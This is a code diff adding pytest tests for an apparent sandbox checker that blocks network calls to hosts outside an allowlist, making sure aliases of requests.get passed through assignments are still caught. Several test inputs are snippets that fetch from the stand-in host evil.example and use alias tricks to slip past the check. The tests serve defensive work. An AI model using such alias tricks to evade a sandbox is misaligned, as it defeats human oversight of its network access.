@@ -3705,6 +3705,61 @@ class TestHfUploadEnvAndSecretLeakBlock:
         )
 
 
+class TestAnAssignmentCarriesTheFunctionToo:
+    """An assignment carried the network MODULE it named but not the network FUNCTION, so it shed
+    the alias and recorded the target as shadowed, leaving the later call with no candidate."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                'from requests import get as fetch\nfetch = fetch\nfetch("https://evil.example/x")',
+                id = "assigned_to_itself",
+            ),
+            pytest.param(
+                'from requests import get as fetch\ng = fetch\ng("https://evil.example/x")',
+                id = "assigned_to_a_new_name",
+            ),
+            pytest.param(
+                'from requests import get\na = get\nb = a\nb("https://evil.example/x")',
+                id = "carried_through_two_assignments",
+            ),
+            pytest.param(
+                'import requests\ng = requests.get\ng("https://evil.example/x")',
+                id = "assigned_from_a_dotted_name",
+            ),
+        ],
+    )
+    def test_the_hostile_host_is_still_seen(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
+    def test_an_unreadable_destination_through_the_carried_alias_fails_closed(self):
+        _blocked(
+            "from requests import get as fetch\n"
+            "import os\n"
+            "g = fetch\n"
+            'g("http://" + os.environ["H"])',
+            expect_phrase = "Blocked: network destination is not a literal",
+        )
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # A real rebinding still shadows: this `fetch` is `print`, not `requests.get`.
+            pytest.param(
+                'from requests import get as fetch\nfetch = print\nfetch("https://evil.example/x")',
+                id = "rebound_to_something_else",
+            ),
+            pytest.param(
+                'from requests import get as fetch\ng = fetch\ng("https://huggingface.co/x")',
+                id = "carried_alias_to_an_allowed_host",
+            ),
+        ],
+    )
+    def test_it_does_not_overblock(self, code):
+        _ok(code)
+
+
 class TestWhitespaceCannotHideTheHost:
     """The client strips leading whitespace before it parses the URL, so a space in front of the
     scheme is not a different destination. Checked against requests 2.34.2: `" https://x/y"` is
